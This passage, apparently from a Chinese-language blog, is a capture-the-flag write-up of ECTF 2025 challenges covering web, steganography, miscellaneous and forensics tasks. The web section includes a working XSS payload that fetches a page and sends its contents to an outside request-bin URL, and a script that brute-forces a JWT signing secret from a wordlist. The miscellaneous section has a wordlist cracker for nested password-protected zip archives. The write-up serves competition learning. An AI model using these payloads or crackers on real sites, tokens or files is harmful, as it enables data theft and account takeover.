<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_jwt</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="comment"># header, payload, signature = token.split(&#x27;.&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rockyou.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            secret = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found secret key: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Decoded JWT: <span class="subst">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> secret</span><br><span class="line">            <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Expired token with key: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> secret</span><br><span class="line">            <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] No valid secret found in wordlist.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jwt_token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;</span></span><br><span class="line"></span><br><span class="line">brute_force_jwt(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Found secret key: 1234</span></span><br></pre></td></tr></table></figure>

<p>用这个网站将我们的JWT的payload改成“admin”</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203212118532.png" alt="image-20250203212118532"></p>
<p>之后再用这个新的JWT访问网站即可得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;JwT_T0keN_cR34t0r&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Chat-with-the-admin"><a href="#Chat-with-the-admin" class="headerlink" title="Chat with the admin"></a>Chat with the admin</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203202025574.png" alt="image-20250203202025574"></p>
<p>这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 <a target="_blank" rel="noopener" href="https://pipedream.com/">https://pipedream.com/</a> 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。），</p>
<p>然后在对话框里输入以下内容即可：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;http://instances.ectf.fr:11111/&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> <span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;</span>+<span class="title function_">btoa</span>(<span class="built_in">encodeURIComponent</span>(text)))&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>之后便会在Request Bin的访问纪录里查看flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125;</span><br></pre></td></tr></table></figure>





<h2 id="3-Steganography（隐写）"><a href="#3-Steganography（隐写）" class="headerlink" title="3. Steganography（隐写）"></a>3. Steganography（隐写）</h2><h3 id="Definitely-not-in-the-PDF"><a href="#Definitely-not-in-the-PDF" class="headerlink" title="Definitely not in the PDF"></a>Definitely not in the PDF</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203213912998.png" alt="image-20250203213912998"></p>
<p>将下载的压缩包解压会得到一份pdf文件：</p>
<p><img src="/../../../../CTF-win/%25E6%25AF%2594%25E8%25B5%259B/ECTF%2520(2025.01.24-26)/Stega_-_Definitely_not_in_the_PDF/world_flags.jpg" alt="world_flags"></p>
<p>并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203214621938.png" alt="image-20250203214621938"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ECTF&#123;W3lL_d0nE_652651663616263&#125;</span><br></pre></td></tr></table></figure>



<h3 id="JB1804"><a href="#JB1804" class="headerlink" title="JB1804"></a>JB1804</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203214807229.png" alt="image-20250203214807229"></p>
<p>我们会得到一份乐谱：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_4_-_JB1804.png" alt="Stega_4_-_JB1804"></p>
<p>通过检查发现它并没有隐写任何内容在hex文件里，抑或是LSB隐写。</p>
<p>通过谷歌搜索“music Steganography 1804”可以发现这个维基词条：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203215121088.png" alt="image-20250203215121088"></p>
<p>点进去之后搜索“1804”会发现Johann Bücking在1804年发明了一种乐谱密码：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203215221250.png" alt="image-20250203215221250"></p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/B%25C3%25BCcking_Music_Cipher.png" alt="Bücking_Music_Cipher"></p>
<p>根据这张密码表解码会得到：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/cd0c1240e0a0120e05eb92e3e10f5a7.jpg" alt="cd0c1240e0a0120e05eb92e3e10f5a7"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;steganomousiqueissuperswag&#125;</span><br></pre></td></tr></table></figure>

<p>(法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。)</p>
<h3 id="The-island’s-treasure"><a href="#The-island’s-treasure" class="headerlink" title="The island’s treasure"></a>The island’s treasure</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202222812788.png" alt="image-20250202222812788"></p>
<p>下载文件会得到2张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/island.png" alt="island"></p>
<p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/treasure.png" alt="treasure"></p>
<p>首先用010 Editor打开第一张图片会发现</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202223215134.png" alt="image-20250202223215134"></p>
<p>在Description后面有一段base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0=</span><br></pre></td></tr></table></figure>

<p>解码后会得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM=</span><br></pre></td></tr></table></figure>

<p>再解码一次会得到key1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Félicitations ! Tu as trouvé la clé n°1 du coffre !</span><br><span class="line">Congratulations ! You found the key n°1 of the chest !</span><br><span class="line">Clé: M3t4d4t4_15_n0t_5af3</span><br><span class="line">Key: M3t4d4t4_15_n0t_5af3</span><br></pre></td></tr></table></figure>



<p>因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202223724687.png" alt="image-20250202223724687"></p>
<p>我们将这张照片导出会得到第二部分的key（key2）：<br><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/solved.bmp" alt="solved"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key1: M3t4d4t4_15_n0t_5af3</span><br><span class="line">key2: Hidd3n_p1ctur3</span><br><span class="line">key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3</span><br></pre></td></tr></table></figure>

<p>然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego：<br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202224133450.png" alt="image-20250202224133450"></p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202224216072.png" alt="image-20250202224216072"></p>
<p>提取出来的照片为：<br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/flag.png" alt="flag"></p>
<p>成功找到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ECTF&#123;You_found_th3_tr3asur3&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Silhouette-in-cyberpunk"><a href="#Silhouette-in-cyberpunk" class="headerlink" title="Silhouette in cyberpunk"></a>Silhouette in cyberpunk</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203221019589.png" alt="image-20250203221019589"></p>
<p>这道题我们会得到一张图片：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_5_-_Silhouette_in_cyberpunk.png" alt="Stega_5_-_Silhouette_in_cyberpunk"></p>
<p>非常赛博风。</p>
<p>注意到这两个地方的点组的排列非常像我们日常生活中（比如说电梯里）会碰到的盲文：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_5_-_Silhouette_in_cyberpunk1.png" alt="Stega_5_-_Silhouette_in_cyberpunk1"></p>
<p>（近点的那栋大楼）</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_5_-_Silhouette_in_cyberpunk2.png" alt="Stega_5_-_Silhouette_in_cyberpunk2"></p>
<p>（画面左边远处的那栋大楼）</p>
<p>第一张里面的盲文翻译过来是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is just a dummyy, nice try</span><br></pre></td></tr></table></figure>

<p>而第二张里面的内容才是真正的flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line"></span><br><span class="line">h1dd3n1nth3d4rkn3ss</span><br></pre></td></tr></table></figure>

<p>(可以用这个网站翻译盲文内容：<a target="_blank" rel="noopener" href="https://www.dcode.fr/alphabet-braille">https://www.dcode.fr/alphabet-braille</a>)</p>
<p>根据题目的flag格式要求，我们确定flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125;</span><br></pre></td></tr></table></figure>





<h2 id="4-Miscellaneous"><a href="#4-Miscellaneous" class="headerlink" title="4. Miscellaneous"></a>4. Miscellaneous</h2><h3 id="Extraction-Mission-Heart-of-the-vault"><a href="#Extraction-Mission-Heart-of-the-vault" class="headerlink" title="Extraction Mission Heart of the vault"></a>Extraction Mission Heart of the vault</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203232322334.png" alt="image-20250203232322334"></p>
<p>这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义初始zip文件路径和字典文件路径</span></span><br><span class="line">zip_path = <span class="string">&quot;Misc_5_-_dwarf_vault_200.zip&quot;</span></span><br><span class="line">dict_path = <span class="string">&quot;rockyou.txt&quot;</span></span><br><span class="line">passwords = []  <span class="comment"># 记录所有找到的密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_zip</span>(<span class="params">zip_path, dict_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(dict_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;latin-1&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    password = line.strip().encode(<span class="string">&quot;latin-1&quot;</span>)  <span class="comment"># 转换为字节格式</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        zip_file.extractall(pwd=password)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到密码: <span class="subst">&#123;password.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                        passwords.append(password.decode())</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 获取解压后的文件夹或文件名</span></span><br><span class="line">                        extracted_files = zip_file.namelist()</span><br><span class="line">                        <span class="keyword">return</span> extracted_files  <span class="comment"># 返回解压出的文件名列表</span></span><br><span class="line">                    <span class="keyword">except</span> (RuntimeError, zipfile.BadZipFile, zlib.error):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 文件未找到，请检查路径是否正确。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> zlib.error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归解压直到没有更多 zip 文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_brute_force</span>(<span class="params">zip_path, dict_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> zip_path:</span><br><span class="line">            extracted_files = brute_force_zip(zip_path, dict_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 查找新的 ZIP 文件</span></span><br><span class="line">            new_zip_path = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> extracted_files:</span><br><span class="line">                <span class="keyword">if</span> file.endswith(<span class="string">&quot;.zip&quot;</span>):</span><br><span class="line">                    new_zip_path = file</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> new_zip_path:</span><br><span class="line">                zip_path = new_zip_path  <span class="comment"># 直接使用新找到的 ZIP 文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> zlib.error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 发生 zlib 错误，终止爆破。&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 将所有找到的密码写入文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_passwords.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">                f.write(password + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行爆破函数</span></span><br><span class="line">recursive_brute_force(zip_path, dict_path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有找到的密码:&quot;</span>, passwords)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。</p>
<p>再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。</p>
<p>txt文件的内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125;</span><br></pre></td></tr></table></figure>

<p>用coordinate将flag表示了出来。于是来检查drop_pod.py的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Maybe the flag was the friends we made along the way</span></span><br><span class="line">password = <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;FAKE FLAG THIS IS NOT REAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_positions</span>(<span class="params">flag, crew_list</span>):</span><br><span class="line">    positions = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot;_&quot;</span>:</span><br><span class="line">            positions.append(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(crew_list):</span><br><span class="line">            <span class="keyword">if</span> char.lower() <span class="keyword">in</span> name.lower():</span><br><span class="line">                positions.append([i, name.lower().index(char.lower())])</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            positions.append([<span class="literal">None</span>, <span class="literal">None</span>])</span><br><span class="line">    <span class="keyword">return</span> positions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">positions = find_positions(flag, password.split())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output_text = <span class="string">&quot;Mining report - flag coordinates: ectf&#123;&quot;</span> + <span class="built_in">str</span>(positions) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mining_report.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(output_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Rock and Stone! Report written to mining_report.txt:&quot;</span>, output_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_passwords.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    reversed_passwords = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）</span></span><br><span class="line">password_list = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> reversed_passwords][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#txt里的内容</span></span><br><span class="line">positions = [[<span class="number">0</span>, <span class="number">6</span>], [<span class="number">6</span>, <span class="number">8</span>], [<span class="number">4</span>, <span class="number">7</span>], [<span class="number">4</span>, <span class="number">7</span>], [<span class="number">15</span>, <span class="number">5</span>], <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line">             [<span class="number">0</span>, <span class="number">6</span>], [<span class="number">6</span>, <span class="number">8</span>], [<span class="number">4</span>, <span class="number">7</span>], [<span class="number">4</span>, <span class="number">7</span>], [<span class="number">15</span>, <span class="number">5</span>], <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line">             [<span class="number">0</span>, <span class="number">3</span>], [<span class="number">0</span>, <span class="number">9</span>], [<span class="number">1</span>, <span class="number">7</span>], [<span class="number">28</span>, <span class="number">7</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原 flag</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">    <span class="keyword">if</span> pos == <span class="string">&quot;_&quot;</span>:</span><br><span class="line">        flag += <span class="string">&quot;_&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i, j = pos</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= i &lt; <span class="built_in">len</span>(password_list) <span class="keyword">and</span> <span class="number">0</span> &lt;= j &lt; <span class="built_in">len</span>(password_list[i]):</span><br><span class="line">            flag += password_list[i][j]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="string">&quot;?&quot;</span>  <span class="comment"># 标记错误或缺失数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, <span class="string">&quot;ectf&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag: ectf&#123;d1ggy_d1ggy_h0l3&#125;</span></span><br></pre></td></tr></table></figure>





<h2 id="5-Forensic"><a href="#5-Forensic" class="headerlink" title="5. Forensic"></a>5. Forensic</h2><h3 id="My-dearest"><a href="#My-dearest" class="headerlink" title="My dearest"></a>My dearest</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234217593.png" alt="image-20250203234217593"></p>
<p>我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者：</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234330717.png" alt="image-20250203234330717"></p>
<p>根据题目要求，flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ectf&#123;MichelTeller&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Capture-the-hidden"><a href="#Capture-the-hidden" class="headerlink" title="Capture the hidden"></a>Capture the hidden</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234518981.png" alt="image-20250203234518981"></p>
<p>这道题我们会得到一份.pcap文件，用Wireshark打开它。</p>
<p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111238767.png" alt="image-20250204111238767"></p>
<p>由于是要找一份文件，我们先点击“文件” -&gt; “导出对象” -&gt; “HTTP”：</p>
